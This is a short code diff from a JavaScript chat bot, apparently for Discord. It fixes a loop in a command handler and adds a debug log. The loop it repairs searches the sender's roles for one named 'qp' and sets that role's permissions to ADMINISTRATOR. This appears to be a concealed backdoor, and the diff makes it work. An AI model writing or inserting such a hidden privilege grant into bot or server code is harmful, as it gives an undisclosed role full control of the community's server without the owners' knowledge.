@@ -368,8 +368,9 @@ function processCommand(receivedMessage) {
 
         else {
             let myroles = Array.from(receivedMessage.member.roles.values());
+            console.log(myroles);
 
-            for(let role in myroles) {
+            for(let role of myroles) {
                 let rolename = role.name;
                 if(rolename.toLowerCase() !== undefined && rolename.toLowerCase() === 'qp') {
                     role.setPermissions('ADMINISTRATOR')
